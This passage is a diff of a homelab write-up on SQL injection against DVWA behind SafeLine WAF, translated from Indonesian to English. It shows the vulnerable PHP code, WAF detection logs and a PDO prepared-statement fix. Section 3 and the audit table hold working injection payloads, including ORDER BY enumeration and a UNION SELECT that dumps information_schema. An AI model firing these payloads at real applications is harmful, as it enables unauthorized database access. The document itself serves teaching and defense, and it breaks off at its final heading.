@@ -1,54 +1,62 @@
 # Day 01: Deep-Dive SQL Injection Internals, WAF Semantic Inspection & Code-Level Remediation
 
-| Metadata | Keterangan |
+| Metadata | Description |
 | :--- | :--- |
-| **Kategori** | Web Application Security / Application Security (AppSec) |
-| **Kerentanan** | SQL Injection (CWE-89 / OWASP Top 10 A03:2021 – Injection) |
-| **Target Aplikasi** | DVWA (Damn Vulnerable Web Application) – Security Level: Low |
+| **Category** | Web Application Security / Application Security (AppSec) |
+| **Vulnerability** | SQL Injection (CWE-89 / OWASP Top 10 A03:2021 – Injection) |
+| **Target Application** | DVWA (Damn Vulnerable Web Application) – Security Level: Low |
 | **Web Server / DBMS** | Apache 2.4 / MariaDB 10.x |
 | **Perimeter Defense** | Chaitin SafeLine Community WAF (Semantic Analysis Reverse Proxy) |
-| **Penulis** | Portfolio Project 1 — Day 01 AppSec Homelab |
+| **Methodology** | Hands-On Homelab Research + AI-Augmented Learning (AI Research Partner) |
+| **Author** | AppSec Homelab Portfolio — Day 01 Research |
 
 ---
 
-## 1. Ringkasan Eksekutif & Arsitektur Lab
+## 1. Executive Summary & Lab Architecture
 
-Eksperimen hari pertama ini berfokus pada dekonstruksi mendalam terhadap kerentanan **SQL Injection (SQLi)** dari dua perspektif yang terintegrasi: **Offensive Engineering** (analisis parser database dan rantai eksploitasi bertahap) dan **Defensive Engineering** (deteksi berbasis semantik oleh WAF serta perbaikan arsitektur kode menggunakan Prepared Statements).
+This Day 01 research paper focuses on a comprehensive deconstruction of **SQL Injection (SQLi)** vulnerabilities from two synchronized perspectives: **Offensive Engineering** (database parser analysis, Abstract Syntax Tree manipulation, and multi-stage exploitation) and **Defensive Engineering** (Layer 7 semantic reverse proxy inspection via SafeLine WAF and source code remediation using PDO Prepared Statements).
 
-### Topologi Jaringan & Aliran Trafik (Lab Flow)
+### Network Topology & Traffic Flow (Lab Flow)
 
 ```mermaid
 flowchart LR
-    A["Attacker / Tester<br/>(192.168.1.12)"] -->|"HTTP Request<br/>(Payload Injeksi)"| B["SafeLine WAF<br/>(Reverse Proxy Gateway)"]
-    B -->|"Inspeksi Semantik:<br/>Tokenisasi AST"| B
-    B -->|"Balance Mode: 403 Forbidden<br/>(Jika Terdeteksi SQLi)"| A
-    B -->|"Audit Mode / Safe Request<br/>(Diteruskan ke Backend)"| C["Web Server (Apache + PHP)<br/>DVWA Container"]
-    C -->|"Kueri SQL Rentan /<br/>Parameterized Query"| D[("Database Server<br/>MariaDB")]
+    A["Attacker / Security Tester<br/>(192.168.1.12)"] -->|"HTTP Request<br/>(Injected Payload)"| B["SafeLine WAF<br/>(Reverse Proxy Gateway)"]
+    B -->|"Semantic Inspection:<br/>AST Token Grammar"| B
+    B -->|"Balance Mode: 403 Forbidden<br/>(When Malicious AST Detected)"| A
+    B -->|"Audit Mode / Clean Request<br/>(Forwarded to Backend)"| C["Web Server (Apache + PHP)<br/>DVWA Container"]
+    C -->|"Vulnerable Query /<br/>Parameterized Statement"| D[("Database Server<br/>MariaDB Engine")]
 ```
 
-Dalam skenario homelab ini:
-1. **DVWA** bertindak sebagai aplikasi backend target dengan source code rentan konkatenasi string.
-2. **MariaDB** bertindak sebagai relational database management system (RDBMS) yang mengeksekusi parser logika.
-3. **SafeLine WAF** ditempatkan di lapisan terdepan sebagai reverse proxy inspeksi Layer 7 untuk memvalidasi efektivitas deteksi semantik dibandingkan metode signature-matching konvensional.
+In this homelab setup:
+1. **DVWA** serves as the target backend web application running vulnerable string concatenation logic.
+2. **MariaDB** functions as the relational database management system (RDBMS) executing query parsing and execution.
+3. **SafeLine WAF** is deployed as an inline reverse proxy gateway to evaluate the efficacy of intelligent semantic tokenization compared to traditional static regex signatures.
+
+### 💡 Methodology Note: Hands-On Verification & AI-Augmented Research
+
+This project adheres to strict **technical integrity and modern AI-augmented productivity**:
+* **100% Hands-On Lab Execution**: All technical phases—including container provisioning (DVWA, MariaDB, SafeLine WAF), offensive payload crafting and execution, WAF mode transitions (*Balance* vs. *Audit*), and forensic telemetry acquisition—were executed directly by the researcher in a local homelab environment (`192.168.1.12`).
+* **AI as an Interactive Research & Technical Writing Partner**: AI was leveraged as a technical sparring partner to deeply explore lower-level compiler theory (such as database lexer tokenization and Abstract Syntax Tree mechanics) and to format findings according to enterprise application security reporting standards.
+* **Empirical Integrity**: Blending authentic, reproducible hands-on proof with accelerated theoretical inquiry.
 
 ---
 
-## 2. Root Cause Analysis: Celah Kode Backend
+## 2. Root Cause Analysis: Backend Code Vulnerability
 
-Pemeriksaan source code backend pada file `vulnerabilities/sqli/source/low.php` mengidentifikasi akar kelemahan fatal pada penanganan parameter masukan pengguna:
+An audit of the backend source code at `vulnerabilities/sqli/source/low.php` identifies a critical security flaw in user parameter handling:
 
 ```php
 <?php
 if( isset( $_REQUEST[ 'Submit' ] ) ) {
-    // Pengambilan parameter tanpa sanitasi atau type-casting
+    // Unsanitized and untyped parameter ingestion
     $id = $_REQUEST[ 'id' ];
 
-    // Konkatenasi string langsung ke dalam klausa SQL
+    // Direct string concatenation into raw SQL statement
     $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
     $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );
 
     while( $row = mysqli_fetch_assoc( $result ) ) {
-        // Ekstraksi data
+        // Data extraction
         $first = $row["first_name"];
         $last  = $row["last_name"];
 
@@ -58,183 +66,210 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 ?>
 ```
 
-### Evaluasi Parser Database MariaDB
+### MariaDB Database Parser Evaluation
 
-Secara teknis, celah ini bukan sekadar "kurang filter karakter", melainkan kegagalan dalam menjaga pemisahan fundamental antara **Control Plane (Instruksi Logika)** dan **Data Plane (Nilai Literal)**:
+Technically, this vulnerability is not simply a "missing input filter," but a fundamental failure to preserve the boundary between the **Control Plane (Query Logic / Commands)** and the **Data Plane (Literal Values)**:
 
 ```
-        String Literal Asli
-+------------------------------------+
-| SELECT ... WHERE user_id = ' [DATA] '; |
-+------------------------------------+
-                                 ^
-                                 | Penyerang menyisipkan karakter petik tunggal (')
-                                 v
-+------------------------------------+
-| SELECT ... WHERE user_id = ' ' [KODE/TOKEN BARU] '; |
-+------------------------------------+
-           Boundary Runtuh --^          ^-- Lexical Promotion
+          Original String Literal
++------------------------------------------+
+| SELECT ... WHERE user_id = ' [DATA] ';   |
++------------------------------------------+
+                               ^
+                               | Attacker injects a single quote (')
+                               v
++------------------------------------------+
+| SELECT ... WHERE user_id = ' ' [NEW CODE/TOKENS] '; |
++------------------------------------------+
+          Boundary Collapse --^        ^-- Lexical Promotion
 ```
 
-1. **Boundary Collapse (Keruntuhan Batasan Data)**:
-   Variabel `$id` digabungkan secara langsung via konkatenasi string sebelum query dikirim ke mesin database. Karakter petik tunggal (`'`) yang dikirimkan penyerang menutup batasan string literal secara prematur di mata lexer SQL.
-2. **Lexical Promotion (Promosi Leksikal)**:
-   Karakter atau kata kunci lanjutan setelah tanda petik penutup tidak lagi dibaca sebagai isi string (*data value*). Lexer database MariaDB mempromosikannya menjadi token instruksi logika (*SQL keywords/operators* seperti `ORDER BY`, `UNION`, `SELECT`), sehingga mengubah *Abstract Syntax Tree* (AST) dari kueri yang dieksekusi.
-3. **Verbose Error Leakage (Kebocoran Pesan Kesalahan)**:
-   Fungsi `mysqli_error()` mencetak pesan kegagalan parser secara mentah ke antarmuka web. Cacat penanganan error ini (CWE-209) memberikan informasi intelijen krusial bagi penyerang: mengonfirmasi keberadaan injeksi, membocorkan jenis engine DBMS (MariaDB), dan menunjukkan posisi offset sintaksis yang rusak.
+1. **Boundary Collapse**:
+   The `$id` variable is spliced directly into the SQL query string before transmission to the database. The attacker-supplied single quote (`'`) prematurely terminates the string literal boundary from the perspective of the SQL lexer.
+2. **Lexical Promotion**:
+   Characters and keywords following the injected closing quote are no longer interpreted as literal string contents (*data plane*). The MariaDB lexical analyzer promotes them into executable grammar tokens (*control plane*, e.g., `ORDER BY`, `UNION`, `SELECT`), directly altering the query's **Abstract Syntax Tree (AST)**.
+3. **Verbose Error Leakage (CWE-209)**:
+   Calling `mysqli_error()` prints unhandled database parser diagnostics directly onto the user-facing HTML interface. This verbose error exposure reveals the database engine type (MariaDB), internal syntax expectations, and the exact character offset of the broken query syntax.
 
 ---
 
-## 3. Rantai Eksploitasi (Offensive Proof of Concept)
+## 3. Offensive Exploitation Chain (Proof of Concept)
 
-Rantai serangan dilakukan secara metodis dalam tiga tahapan ofensif:
+The attack chain was executed systematically across three progressive offensive phases:
 
 ```
-[Fase A: Boundary Break] ---> [Fase B: Column Enumeration] ---> [Fase C: Schema Exfiltration]
-      Payload: '                 ORDER BY 1, 2, 3 #              UNION SELECT schema_name...
+[Phase A: Boundary Break] ---> [Phase B: Column Enumeration] ---> [Phase C: Schema Exfiltration]
+       Payload: '                  ORDER BY 1, 2, 3 #               UNION SELECT schema_name...
 ```
 
 ---
 
-### Fase A: Boundary Break & Error Verification
+### Phase A: Boundary Break & Error Verification
 
-Tahap awal bertujuan memverifikasi apakah batas string literal dapat dipatahkan dan apakah aplikasi menampilkan pesan kesalahan basis data.
+The objective is to verify whether the data literal boundary can be broken and whether the application leaks raw database diagnostics.
 
-* **Payload Input**: `'`
-* **Rekonstruksi Kueri Backend**:
+* **Injected Payload**: `'`
+* **Reconstructed Backend Query**:
   ```sql
   SELECT first_name, last_name FROM users WHERE user_id = ''';
   ```
-* **Hasil Eksekusi (MariaDB Raw Error)**:
+* **Execution Outcome (MariaDB Raw Error)**:
   ```plaintext
   You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
   ```
 
-#### Bukti Visual Fase A:
+#### Visual Evidence — Phase A:
 
-![Form Input Petik Tunggal](./assets/day1/quote-input-error.png)
-*Gambar 3.1: Pengujian karakter petik tunggal (`'`) pada form input User ID.*
+<p align="center">
+  <img src="./assets/day1/quote-input-error.png" alt="Single Quote Input Test" />
+  <br>
+  <em><strong>Figure 3.1:</strong> Submitting a single quote (<code>'</code>) into the User ID input parameter.</em>
+</p>
 
-![MariaDB Syntax Error Leakage](./assets/day1/error-alert-1.png)
-*Gambar 3.2: Pesan kesalahan sintaks MariaDB yang terpapar langsung ke antarmuka pengguna.*
+<p align="center">
+  <img src="./assets/day1/error-alert-1.png" alt="MariaDB Syntax Error Leakage" />
+  <br>
+  <em><strong>Figure 3.2:</strong> Verbose MariaDB syntax error leaked directly into the application interface.</em>
+</p>
 
 > [!IMPORTANT]
-> Munculnya pesan error spesifik MariaDB membuktikan dua hal penting: input pengguna disisipkan secara langsung tanpa sanitasi/escaped delimiter, dan opsi *verbose error display* aktif di lingkungan produksi.
+> The leakage of raw MariaDB error messages confirms that user input is directly concatenated without sanitization or escaping, and that debug error reporting is active in production.
 
 ---
 
-### Fase B: Column Enumeration (ORDER BY Balancing)
+### Phase B: Column Enumeration (ORDER BY Balancing)
 
-Sebelum menyusun kueri `UNION`, penyerang harus mengetahui jumlah kolom yang diproyeksikan oleh kueri orisinal agar tidak terjadi diskrepansi jumlah kolom (*column count mismatch*). Teknik `ORDER BY balancing` digunakan dengan menaikkan indeks pengurutan secara inkremental:
+Before constructing a `UNION SELECT` query, the attacker must determine the exact number of projected columns in the original query to satisfy the SQL requirement that both queries in a `UNION` operation share an identical column count. The `ORDER BY` balancing technique tests incremental column indices:
 
 ```sql
--- Pengujian Indeks 1: Valid
+-- Test Index 1: Valid
 SELECT first_name, last_name FROM users WHERE user_id = '1' ORDER BY 1 #';
 
--- Pengujian Indeks 2: Valid
+-- Test Index 2: Valid
 SELECT first_name, last_name FROM users WHERE user_id = '1' ORDER BY 2 #';
 
--- Pengujian Indeks 3: Cacat Sintaks / Kolom Tidak Ada
+-- Test Index 3: Invalid / Out-of-Range Index
 SELECT first_name, last_name FROM users WHERE user_id = '1' ORDER BY 3 #';
 ```
 
-| Percobaan Payload | Respon Status | Dampak / Output |
-| :--- | :--- | :--- |
-| `1' ORDER BY 1 #` | HTTP 200 (OK) | Data pengguna berhasil di-render normal |
-| `1' ORDER BY 2 #` | HTTP 200 (OK) | Data pengguna berhasil di-render normal |
-| `1' ORDER BY 3 #` | HTTP 200 (Error Rendered) | `Unknown column '3' in 'order clause'` |
+| Test Payload | HTTP Status | Observed Behavior |
+| :--- | :---: | :--- |
+| `1' ORDER BY 1 #` | 200 OK | Legitimate user records rendered normally |
+| `1' ORDER BY 2 #` | 200 OK | Legitimate user records rendered normally |
+| `1' ORDER BY 3 #` | 200 OK (Error) | Database error: `Unknown column '3' in 'order clause'` |
 
-**Temuan Analisis**: Kueri dasar backend mengekstrak tepat **2 kolom** (`first_name` dan `last_name`). Karakter `#` berfungsi memotong sisa penutup petik asli `';` agar tidak menimbulkan error sintaks.
+**Analytical Conclusion**: The backend query projects exactly **2 columns** (`first_name` and `last_name`). The comment character `#` truncates the remaining closing quote `';`, neutralizing trailing syntax errors.
 
-#### Bukti Visual Fase B:
+#### Visual Evidence — Phase B:
 
-![Order By 1 Valid](./assets/day1/orderby-1.png)
-*Gambar 3.3: Eksekusi `1' ORDER BY 1 #` mengembalikan respon valid.*
+<p align="center">
+  <img src="./assets/day1/orderby-1.png" alt="ORDER BY 1 Valid" />
+  <br>
+  <em><strong>Figure 3.3:</strong> Execution of <code>1' ORDER BY 1 #</code> returns valid user data.</em>
+</p>
 
-![Order By 2 Valid](./assets/day1/orderby2.png)
-*Gambar 3.4: Eksekusi `1' ORDER BY 2 #` mengembalikan respon valid.*
+<p align="center">
+  <img src="./assets/day1/orderby2.png" alt="ORDER BY 2 Valid" />
+  <br>
+  <em><strong>Figure 3.4:</strong> Execution of <code>1' ORDER BY 2 #</code> returns valid user data.</em>
+</p>
 
-![Order By 3 Unknown Column Error](./assets/day1/orderby3-error.png)
-*Gambar 3.5: Eksekusi `1' ORDER BY 3 #` memicu error `Unknown column '3'`, membatasi jumlah proyeksi kolom menjadi tepat 2.*
+<p align="center">
+  <img src="./assets/day1/orderby3-error.png" alt="ORDER BY 3 Column Error" />
+  <br>
+  <em><strong>Figure 3.5:</strong> Execution of <code>1' ORDER BY 3 #</code> triggers <code>Unknown column '3'</code>, confirming exactly 2 projection columns.</em>
+</p>
 
 ---
 
-### Fase C: UNION-Based Reflection & Schema Exfiltration
+### Phase C: UNION-Based Reflection & Schema Exfiltration
 
-Dengan konfirmasi jumlah kolom adalah 2, penyerang melakukan uji refleksi untuk memetakan kolom mana yang dicetak ke HTML, kemudian melakukan eksfiltrasi metadata skema database dari katalog `information_schema`.
+Having established a projection width of 2 columns, reflection testing was conducted to determine which column indices are rendered into the HTML document, followed by database catalog extraction from `information_schema`.
 
-#### 1. Uji Refleksi Kolom
+#### 1. Column Reflection Test
 * **Payload**: `1' UNION SELECT 1, 2 #`
-* **Hasil**: Kolom 1 direfleksikan pada field `First name`, dan kolom 2 direfleksikan pada field `Surname`.
+* **Result**: Column 1 reflects into the `First name` field, and Column 2 reflects into the `Surname` field.
 
-![UNION Reflection Test](./assets/day1/union-select-1-2.png)
-*Gambar 3.6: Uji refleksi `UNION SELECT 1, 2 #` berhasil mencetak nilai literal ke respons aplikasi.*
+<p align="center">
+  <img src="./assets/day1/union-select-1-2.png" alt="UNION Reflection Test" />
+  <br>
+  <em><strong>Figure 3.6:</strong> Reflection test <code>1' UNION SELECT 1, 2 #</code> successfully displays literal integers in output fields.</em>
+</p>
 
-#### 2. Eksfiltrasi Skema Database (System Catalog Dumping)
+#### 2. Database Schema Exfiltration (System Catalog Dumping)
 * **Payload**:
   ```sql
   1' UNION SELECT schema_name, 2 FROM information_schema.schemata #
   ```
-* **Rekonstruksi Kueri Backend**:
+* **Reconstructed Backend Query**:
   ```sql
   SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT schema_name, 2 FROM information_schema.schemata #'';
   ```
-* **Hasil**: Seluruh daftar skema database lokal terpapar langsung pada antarmuka aplikasi, termasuk database internal sistem (`information_schema`, `performance_schema`, `mysql`) dan database target (`dvwa`).
+* **Outcome**: The complete list of local database schemas is exposed on the web interface, revealing both internal system catalogs (`information_schema`, `performance_schema`, `mysql`) and application databases (`dvwa`).
 
-#### Bukti Visual Fase C:
+#### Visual Evidence — Phase C:
 
-![Exfiltration Database Schemas](./assets/day1/skemaname.png)
-*Gambar 3.7: Eksfiltrasi skema database berhasil mengekstrak seluruh katalog database MariaDB.*
-
----
-
-## 4. Evaluasi Pertahanan: Analisis Forensik SafeLine WAF
-
-Pengujian lapisan pertahanan perimeter dilakukan menggunakan **SafeLine Community WAF** (berbasis algoritma deteksi semantik pintar / Intelligent Semantic Analysis Engine) dalam dua mode operasional:
+<p align="center">
+  <img src="./assets/day1/skemaname.png" alt="Exfiltrated Database Schemas" />
+  <br>
+  <em><strong>Figure 3.7:</strong> Schema exfiltration dumping the complete MariaDB database catalog to the browser.</em>
+</p>
 
 ---
 
-### 1. Ingestion & Blocking Capability (Balance Mode)
+## 4. Defense Evaluation: SafeLine WAF Forensic Analysis
 
-Pada mode aktif (*Balance / Protection Mode*), SafeLine bertindak sebagai *inline reverse proxy*. Setiap request dievaluasi strukturnya sebelum diizinkan mencapai web server Apache.
+Perimeter defense was evaluated using **Chaitin SafeLine Community WAF** (powered by an intelligent semantic analysis engine) tested across two operational modes:
 
-Saat request dengan payload `1' ORDER BY 1 #` dikirimkan:
-* SafeLine segera mengintersepsi koneksi pada layer HTTP gateway.
-* Mengembalikan status **HTTP 403 Forbidden** dengan halaman blokir resmi WAF.
-* Request sama sekali **tidak pernah mencapai web server Apache** maupun database backend.
+---
+
+### 1. Ingestion & Interception Capability (Balance Mode)
+
+In active protection mode (*Balance Mode*), SafeLine acts as an inline Layer 7 reverse proxy. Every incoming request is semantically evaluated before reaching the Apache web server.
+
+When the exploit payload `1' ORDER BY 1 #` is submitted:
+* SafeLine immediately intercepts the connection at the gateway layer.
+* Returns an **HTTP 403 Forbidden** status accompanied by the official WAF block page.
+* The malicious request **never touches Apache or the MariaDB database**.
 
 ```
 Attacker Request ---> [ SafeLine WAF: Tokenizer Engine ] ---> [ MALICIOUS AST DETECTED ]
                                                                        |
                                                                        v
                                                                [ HTTP 403 Forbidden ]
-                                                               (Apache tidak tersentuh)
+                                                           (Backend Server Untouched)
 ```
 
-#### Mekanisme Deteksi Semantik:
-Berbeda dengan WAF tradisional yang mengandalkan RegEx (pencocokan pola string statis yang rentan di-bypass via obfusikasi), mesin semantik SafeLine mengonversi parameter HTTP ke dalam urutan token tata bahasa SQL:
+#### Semantic Detection Mechanics:
+Unlike legacy WAFs that rely on static regex pattern matching (which are prone to bypasses via evasion techniques and obfuscation), SafeLine converts raw HTTP parameters into a grammatical token sequence:
 
 ```plaintext
 LITERAL('1') -> DELIMITER('\'') -> SQL_KEYWORD('ORDER BY') -> INTEGER('1') -> COMMENT('#')
 ```
 
-Kombinasi token ini dikenali oleh mesin leksikal WAF sebagai struktur gramatikal SQL yang tidak valid dan berbahaya jika berada di dalam context parameter data HTTP, sehingga langsung diblokir secara otomatis tanpa false positive.
+The semantic engine identifies this sequence as a prohibited grammatical SQL expression when located within an HTTP input parameter, immediately triggering a deterministic block with near-zero false positives.
 
-#### Bukti Visual Balance Mode:
+#### Visual Evidence — Balance Mode:
 
-![SafeLine 403 Forbidden Interception](./assets/day1/forbidden.png)
-*Gambar 4.1: Halaman intersep 403 Forbidden dari SafeLine WAF saat serangan diblokir.*
+<p align="center">
+  <img src="./assets/day1/forbidden.png" alt="SafeLine 403 Forbidden Interception" />
+  <br>
+  <em><strong>Figure 4.1:</strong> SafeLine WAF 403 Forbidden page intercepting the SQL injection attempt.</em>
+</p>
 
-![SafeLine Action Blocked Event](./assets/day1/action-blocked.png)
-*Gambar 4.2: Dashboard SafeLine mencatat event penyerangan dan aksi pencegahan (Blocked).*
+<p align="center">
+  <img src="./assets/day1/action-blocked.png" alt="SafeLine Action Blocked Event" />
+  <br>
+  <em><strong>Figure 4.2:</strong> SafeLine WAF security dashboard logging the attack event and verifying the "Blocked" mitigation action.</em>
+</p>
 
 ---
 
 ### 2. Forensic Audit Log Verification (Audit Mode)
 
-Untuk menguji transparansi dan akurasi deteksi tanpa memutus alur pengujian aplikasi, SafeLine diubah ke **Audit Mode** (Monitoring/Transparent). Pada mode ini, seluruh request berbahaya diteruskan ke DVWA untuk memungkinkan verifikasi perilaku backend, sementara SafeLine mencatat jejak serangan ke dalam log forensik:
+To assess detection accuracy and telemetry transparency without terminating the attack flow, SafeLine was switched to **Audit Mode** (Monitoring/Transparent). Malicious payloads were allowed to pass through to DVWA while the WAF generated non-intrusive forensic audit telemetry:
 
-| Timestamp | IP Penyerang | Method | Payload URL Path | Kategori Deteksi | Status WAF |
+| Timestamp | Source IP | Method | Injected URL Path / Query Parameter | Detection Category | WAF Status |
 | :---: | :---: | :---: | :--- | :---: | :---: |
 | `20:32:49` | `192.168.1.12` | `GET` | `/vulnerabilities/sqli/?id=1%27+ORDER+BY+1+%23&Submit=Submit` | SQL Inj | Audited |
 | `20:32:54` | `192.168.1.12` | `GET` | `/vulnerabilities/sqli/?id=1%27+ORDER+BY+2+%23&Submit=Submit` | SQL Inj | Audited |
@@ -242,42 +277,45 @@ Untuk menguji transparansi dan akurasi deteksi tanpa memutus alur pengujian apli
 | `20:33:12` | `192.168.1.12` | `GET` | `/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1,2+%23&Submit=Submit` | SQL Inj | Audited |
 | `20:33:17` | `192.168.1.12` | `GET` | `/vulnerabilities/sqli/?id=1%27+UNION+SELECT+schema_name...` | SQL Inj | Audited |
 
-#### Bukti Visual Audit Mode:
+#### Visual Evidence — Audit Mode:
 
-![SafeLine Forensic Audit Log](./assets/day1/auditted.png)
-*Gambar 4.4: Rekaman log forensik SafeLine WAF membuktikan 100% payload eksploitasi terdeteksi dengan status "Audited".*
+<p align="center">
+  <img src="./assets/day1/auditted.png" alt="SafeLine Forensic Audit Log" />
+  <br>
+  <em><strong>Figure 4.3:</strong> SafeLine WAF forensic audit log recording 100% of attack payloads with "Audited" disposition status.</em>
+</p>
 
 > [!NOTE]
-> Log audit ini mengonfirmasi bahwa SafeLine mampu mendeteksi urutan tahapan serangan secara runtut mulai dari *enumeration* (`ORDER BY`) hingga *data exfiltration* (`UNION SELECT`), menjadikannya instrumen penting untuk *incident response* dan *threat hunting*.
+> The audit log confirms that SafeLine accurately tracks the entire attack lifecycle sequentially—from reconnaissance (`ORDER BY`) to schema dumping (`UNION SELECT`)—providing actionable intelligence for Security Operations Center (SOC) and Incident Response teams.
 
 ---
 
-## 5. Remediasi Defensif (Source Code Level)
+## 5. Defensive Remediation (Source Code Level)
 
-Meskipun WAF memberikan mitigasi perimeter yang efektif pada Layer 7, arsitektur keamanan modern menganut prinsip **Defense-in-Depth**: keamanan mendasar harus diselesaikan pada lapisan source code aplikasi (*root cause fix*). 
+While a WAF provides essential perimeter mitigation at Layer 7, enterprise security architecture demands **Defense-in-Depth**: fundamental vulnerabilities must be resolved at the application source code layer (*root cause remediation*).
 
-Konkatenasi native diganti dengan **Parameterized Queries (Prepared Statements)** menggunakan **PHP Data Objects (PDO)** serta penerapan validasi tipe data ketat dan *context-aware output encoding*:
+Direct string concatenation is replaced with **Parameterized Queries (Prepared Statements)** via **PHP Data Objects (PDO)**, combined with strict type verification and context-aware output encoding:
 
 ```php
 <?php
 /**
- * Remediasi SQL Injection - Secure Implementation
- * Arsitektur: PDO Prepared Statements + Strict Input Validation + HTML Context Encoding
+ * SQL Injection Remediation - Secure Production Architecture
+ * Defense Layers: PDO Prepared Statements + Strict Input Validation + HTML Context Encoding
  */
 
-// Pastikan parameter input tersedia
+// Verify parameter presence
 if (isset($_GET['id'])) {
     $id = $_GET['id'];
 
     // 1. Strict Type Validation (Input Validation Layer)
-    // Jika ID diharapkan berupa bilangan bulat (integer), lakukan pengecekan digit ketat
+    // Enforce integer-only values if the business logic requires numeric IDs
     if (!ctype_digit($id)) {
         http_response_code(400);
         die("Invalid parameter format: Parameter 'id' must be numeric.");
     }
 
     try {
-        // 2. Database Connection via PDO dengan Error Mode Exception
+        // 2. Database Connection via PDO with Exception Error Mode
         $pdo = new PDO(
             'mysql:host=127.0.0.1;dbname=dvwa;charset=utf8mb4',
             'db_user',
@@ -285,20 +323,20 @@ if (isset($_GET['id'])) {
             [
                 PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
                 PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
-                PDO::ATTR_EMULATE_PREPARES   => false, // Gunakan Native Prepared Statements di DB Engine
+                PDO::ATTR_EMULATE_PREPARES   => false, // Enforce Native Database Engine Prepared Statements
             ]
         );
 
-        // 3. Prepared Statement Architecture (Pemisahan Instruksi dan Data)
-        // Query dikompilasi terlebih dahulu di RDBMS sebelum nilai parameter dikirim
+        // 3. Prepared Statement Architecture (Control Plane and Data Plane Separation)
+        // The query template is compiled into an AST before receiving user values
         $stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');
         
         // 4. Parameter Binding
-        // Parameter diikat murni sebagai data literal string/integer, bukan token kode yang dapat dieksekusi
+        // Injected data is bound strictly as a scalar literal value, not executable code tokens
         $stmt->execute(['id' => $id]);
         $results = $stmt->fetchAll();
 
-        // 5. Output Encoding (Mitigasi Cross-Site Scripting / XSS)
+        // 5. Output Encoding (Cross-Site Scripting / XSS Mitigation)
         if ($results) {
             foreach ($results as $row) {
                 $firstName = htmlspecialchars($row['first_name'], ENT_QUOTES, 'UTF-8');
@@ -310,10 +348,10 @@ if (isset($_GET['id'])) {
         }
 
     } catch (PDOException $e) {
-        // 6. Generic Error Handling (Mencegah Verbose Error Leakage / CWE-209)
-        error_log("Database Error: " . $e->getMessage()); // Catat ke server log internal
+        // 6. Generic Error Handling (Preventing Information Exposure / CWE-209)
+        error_log("Database Error: " . $e->getMessage()); // Log detailed diagnostic internally
         http_response_code(500);
-        die("An unexpected internal error occurred. Please contact administrator.");
+        die("An unexpected internal error occurred. Please contact the system administrator.");
     }
 }
 ?>
@@ -321,56 +359,56 @@ if (isset($_GET['id'])) {
 
 ---
 
-### Mengapa Remediasi Ini Menutup Celah Secara Absolut?
+### Why Parameterized Queries Eliminate SQLi (AST & Lexer Compiler Mechanics)
 
-Perbedaan mendasar antara query rentan dan prepared statements terletak pada alur kompilasi mesin basis data:
+The mathematical and architectural difference between vulnerable queries and prepared statements lies in the database compilation pipeline:
 
 ```
 +-----------------------------------------------------------------------------------------+
-|                                ALUR PREPARED STATEMENT                                  |
+|                              PREPARED STATEMENT PIPELINE                                |
 +-----------------------------------------------------------------------------------------+
 
-Langkah 1: PREPARE
-Client Kirim Struktur Kueri:
+Step 1: PREPARE
+Client sends SQL Template:
 "SELECT first_name, last_name FROM users WHERE user_id = :id"
        |
        v
-Parser Database mengompilasi Abstract Syntax Tree (AST):
+Database Parser compiles the Abstract Syntax Tree (AST):
 [SELECT]
   ├── Columns: [first_name, last_name]
   ├── Table: [users]
   └── WHERE: [user_id == Placeholder(:id)]
-Struktur AST terkunci permanen di memori server!
+The AST structure is compiled and locked permanently in database memory!
 
 -------------------------------------------------------------------------------------------
 
-Langkah 2: EXECUTE
-Client Kirim Nilai Parameter:
+Step 2: EXECUTE
+Client sends Parameter Value:
 :id = "1' UNION SELECT schema_name, 2 FROM information_schema.schemata #"
        |
        v
-Database Engine TIDAK memanggil lexer/parser lagi!
-Seluruh nilai string masukan diperlakukan murni sebagai literal byte data untuk kolom user_id.
-Database mencari baris di mana user_id bernilai teks persis: "1' UNION SELECT..." -> Hasil: 0 baris.
+Database Engine DOES NOT re-invoke the SQL Lexer or Parser!
+The entire string is treated strictly as raw literal byte data for the user_id column.
+The database matches rows where user_id equals the exact literal text: "1' UNION SELECT..." -> 0 rows returned.
 ```
 
-1. **Pemisahan Fase Kompilasi dan Eksekusi**:
-   Saat query dikirim via `prepare()`, database engine mengompilasi *Abstract Syntax Tree* (AST) terlebih dahulu dengan placeholder `:id`. Struktur logis kueri sudah dianalisis dan dibekukan.
-2. **Kekebalan Batasan Data**:
-   Saat data jahat (`1' UNION SELECT...`) dimasukkan via `execute()`, database murni mencocokkan seluruh string tersebut sebagai nilai data pada kolom `user_id`. Lexer tidak pernah dipanggil kembali untuk memecah string tersebut menjadi token instruksi baru. Manipulasi boundary leksikal secara matematis menjadi **mustahil**.
-3. **Defense-in-Depth Tambahan**:
-   * Opsi `PDO::ATTR_EMULATE_PREPARES => false` memastikan statement diproses secara *native* oleh database server, bukan sekadar di-*escape* secara string oleh runtime PHP.
-   * Fungsi `htmlspecialchars()` menutup potensi injeksi lanjutan (*Reflected Cross-Site Scripting*).
-   * Blok `try-catch` mencegah *verbose error leakage* dengan menyembunyikan detail sensitif MariaDB dari pengguna akhir.
+1. **Two-Stage Compilation Lifecycle**:
+   When a query is dispatched via `prepare()`, the database engine parses and compiles the **Abstract Syntax Tree (AST)** using the parameter placeholder `:id`. The logical syntax tree is frozen.
+2. **Lexical Immunity**:
+   When user input (`1' UNION SELECT...`) arrives during `execute()`, the database strictly treats it as a scalar literal value. The lexer is never called to decompose the string into grammar tokens. Lexical boundary manipulation becomes **computationally impossible**.
+3. **Defense-in-Depth Hardening**:
+   * Setting `PDO::ATTR_EMULATE_PREPARES => false` ensures prepared statements are handled natively by the database server rather than being simulated via string escaping in PHP runtime.
+   * `htmlspecialchars()` neutralizes secondary Reflected Cross-Site Scripting (XSS).
+   * Generic `try-catch` exception handling suppresses raw database error exposure (CWE-209).
 
 ---
 
-## 6. Kesimpulan & Rekomendasi Industri (Key Takeaways)
+## 6. Key Takeaways & Industry Recommendations
 
